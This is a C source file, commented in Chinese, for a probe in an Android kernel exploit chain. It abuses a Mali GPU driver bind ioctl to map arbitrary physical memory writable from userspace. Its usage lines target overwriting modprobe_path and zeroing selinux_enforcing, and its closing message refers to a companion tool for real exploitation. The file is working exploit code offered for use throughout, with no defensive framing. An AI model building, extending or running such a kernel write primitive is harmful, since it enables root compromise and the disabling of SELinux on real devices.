/*
 * kort_write_probe.c - 验证 BIND 页能否 CPU 直接写 (绕开 PP job 的关键假设)
 *
 * 背景 (use.md §E): PP job 一直 UNKNOWN_ERR, 卡在 GPU 写原语。
 * 但布局修正(phys@24/rights@28)后 mmap 读已通(kort_phys_read2)。
 * 本工具验证 mmap 写是否也通: 若通, 则可 BIND 目标物理页后直接 memcpy 覆盖
 * modprobe_path / selinux_enforcing, 完全不需要 PP job -> 绕开 UNKNOWN_ERR。
 *
 * 编译 (NDK 21.4, 32 位 armeabi-v7a, 静态):
 *   set NDK=C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\21.4.7075529
 *   set CLANG=%NDK%\toolchains\llvm\prebuilt\windows-x86_64\bin\armv7a-linux-androideabi24-clang
 *   %CLANG% kort_write_probe.c -o kort_write_probe -static
 *
 * 用法:
 *   kort_write_probe 0x01080000           仅测该页 mmap 写是否可行(写 0xDEADBEEF 并回读)
 *   kort_write_probe 0x027df000 -s "X"     把该页前 1 字节写成 'X' 并回读(测 modprobe_path 覆盖)
 *   kort_write_probe 0x02a394ec -w 0      把该页前 4 字节写成 0(测 selinux_enforcing 清零)
 *   (PA 务必在 System RAM 内, 否则重启!)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <getopt.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_MEM_BIND   0xC0288302
#define GPU_VA              0x41000000u
#ifndef PAGE_SIZE
#define PAGE_SIZE           0x1000
#endif
#define BIND_FLAGS          0x800
#define BIND_RIGHTS         0x37

static volatile int g_to = 0;
static void alh(int s) { (void)s; g_to = 1; }
static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno; alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40]; memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size, fl = BIND_FLAGS, pa = phys, rights = BIND_RIGHTS;
    memcpy(raw + 0,  &ctx,    8);
    memcpy(raw + 8,  &vaddr,  4);
    memcpy(raw + 12, &sz,     4);
    memcpy(raw + 16, &fl,     4);
    memcpy(raw + 24, &pa,     4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

int main(int argc, char **argv) {
    struct sigaction sa; memset(&sa, 0, sizeof(sa)); sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    char *str = NULL; int have_str = 0;
    long wval = 0; int have_w = 0;
    int c;
    while ((c = getopt(argc, argv, "s:w:")) != -1) {
        switch (c) {
        case 's': str = optarg; have_str = 1; break;
        case 'w': wval = strtol(optarg, 0, 0); have_w = 1; break;
        default: break;
        }
    }
    if (optind >= argc) { printf("usage: %s <phys_addr> [-s string|-w val]\n", argv[0]); return 1; }
    uint32_t pa = strtoul(argv[optind], 0, 0);

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("[-] open /dev/mali"); return 1; }
    printf("[+] opened /dev/mali fd=%d, target phys=0x%08x\n", fd, pa);

    if (bind_phys(fd, pa, GPU_VA, PAGE_SIZE) != 0) { printf("[-] BIND failed\n"); close(fd); return 1; }
    printf("[+] BIND OK\n");

    void *m = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, GPU_VA);
    if (m == MAP_FAILED) {
        printf("[-] mmap(PROT_WRITE) FAILED: %s  -> 仍需 PP job 写原语\n", strerror(errno));
        close(fd); return 2;
    }
    printf("[+] mmap(PROT_WRITE) OK at %p  => CPU 直接写可行! 可绕开 PP job\n", m);

    printf("[*] before: %08x %08x %08x %08x\n",
           ((uint32_t*)m)[0], ((uint32_t*)m)[1], ((uint32_t*)m)[2], ((uint32_t*)m)[3]);

    if (have_str) {
        size_t n = strlen(str);
        if (n > PAGE_SIZE) n = PAGE_SIZE;
        memcpy(m, str, n);
        printf("[+] wrote string \"%s\" (%zu bytes)\n", str, n);
    } else if (have_w) {
        ((uint32_t*)m)[0] = (uint32_t)wval;
        printf("[+] wrote u32 0x%08x at +0\n", (uint32_t)wval);
    } else {
        ((uint32_t*)m)[0] = 0xDEADBEEFu;
        printf("[+] wrote test pattern 0xDEADBEEF at +0\n");
    }

    printf("[*] after : %08x %08x %08x %08x\n",
           ((uint32_t*)m)[0], ((uint32_t*)m)[1], ((uint32_t*)m)[2], ((uint32_t*)m)[3]);
    if (have_str) {
        printf("[*] bytes: ");
        for (size_t i = 0; i < strlen(str); i++) printf("%02x ", ((uint8_t*)m)[i]);
        printf("\n");
    }

    munmap(m, PAGE_SIZE);
    close(fd);
    printf("[*] done (注: 本工具为验证写原语, 未做真实覆盖; 真实利用请用 kort_write 在 System RAM 内操作)\n");
    return 0;
}
